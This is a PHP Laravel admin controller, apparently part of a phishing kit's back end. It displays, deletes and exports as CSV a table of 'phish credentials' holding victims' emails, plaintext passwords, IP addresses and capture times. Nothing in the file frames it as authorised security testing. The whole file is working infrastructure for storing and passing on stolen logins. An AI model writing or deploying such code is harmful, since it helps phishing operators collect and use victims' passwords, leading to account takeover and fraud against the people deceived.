<?php

namespace App\Http\Controllers\Admin;

use App\Http\Controllers\Controller;
use App\Models\PhishCredential;
use Symfony\Component\HttpFoundation\StreamedResponse;

class PhishCredentialController extends Controller
{
    // Show credentials table
    public function index()
    {
        $credentials = PhishCredential::latest()->get();
        return view('admin.credentials.index', compact('credentials'));
    }

    // Export CSV
    public function export()
    {
        $credentials = PhishCredential::latest()->get();

        return new StreamedResponse(function () use ($credentials) {

            $handle = fopen('php://output', 'w');

            // CSV headers
            fputcsv($handle, [
                'ID',
                'Email',
                'Password',
                'IP Address',
                'Captured At'
            ]);

            // CSV rows
            foreach ($credentials as $cred) {
                fputcsv($handle, [
                    $cred->id,
                    $cred->email,
                    $cred->password,
                    $cred->ip_address,
                    $cred->created_at
                ]);
            }

            fclose($handle);

        }, 200, [
            "Content-Type" => "text/csv",
            "Content-Disposition" => "attachment; filename=phish_credentials.csv",
        ]);
    }

    // Delete credential
    public function destroy($id)
    {
        PhishCredential::findOrFail($id)->delete();

        return redirect()
            ->route('admin.credentials')
            ->with('success', 'Credential deleted successfully');
    }
}

